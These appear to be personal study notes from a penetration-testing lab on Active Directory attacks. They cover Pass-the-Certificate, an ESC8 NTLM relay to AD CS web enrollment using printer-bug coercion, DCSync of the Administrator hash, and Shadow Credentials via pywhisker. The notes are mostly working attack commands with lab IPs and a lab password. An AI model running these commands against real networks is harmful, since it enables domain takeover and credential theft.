- [PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that **enables the use of public key cryptography during the initial authentication exchange.**
- `Pass-the-Certificate` refers to the **==technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`.==**
- This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

# AD CS NTLM Relay Attack (ESC8)
---
- `ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay **attack targeting an ADCS HTTP endpoint.**
- ADCS supports **multiple enrollment methods, `including web enrollment`**, which by default occurs over HTTP.
- A certificate authority configured to allow **==web enrollment typically hosts the following application at `/CertSrv`/==**
- Attackers can use **==Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:==**
	- `10.129.234.110` -> Second Machine IP
	- `impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication`
- **Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

- Attackers **can either wait for victims to attempt authentication** against their machine randomly, **or they can actively coerce them into doing so**.
- One way to **==force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py).==**
- This attack requires the targeted machine account to have the **==`Printer Spooler` service running.==**
- The command below forces **`10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:**
	- `python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12`
	- ![[Pasted image 20250705072951.png]]
- Referring back to `ntlmrelayx`, we can see from the output that the **authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`**
	- ![[Pasted image 20250705073016.png]]
- We can **now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`.** One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:
	- `git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools`
	- `python3 -m venv .venv`
	- `source .venv/bin/activate`
	- `pip3 install -r requirements.txt`
- **Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library:
  
	- `pip3 install -I git+https://github.com/wbond/oscrypto.git`
	- `python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache`
	- ![[Pasted image 20250705073216.png]]

- Once we successfully obtain a TGT, **we're back in familiar Pass-the-Ticket (PtT) territory.** 
- As the domain controller's machine account, **we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:**
	- `export KRB5CCNAME=/tmp/dc.ccache`
	- `impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL`

# Shadow Credentials (msDS-KeyCredentialLink)
---
- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the **[msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user.** This attribute **==stores public keys that can be used for authentication via PKINIT.==** 
- In BloodHound, the `AddKeyCredentialLink` edge indicates that one user **has write permissions over another user's `msDS-KeyCredentialLink`** attribute, allowing them to take control of that user.
	- ![[Pasted image 20250705073345.png]]
- We can use **[pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system.** 
- The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:
	- `pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add`
	- ![[Pasted image 20250705073423.png]]
- With the TGT obtained, we may once again `pass the ticket`:
	- `export KRB5CCNAME=/tmp/jpinkman.ccache`
	- `klist`
- In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
	- `evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local`

	![[Pasted image 20250705073459.png]]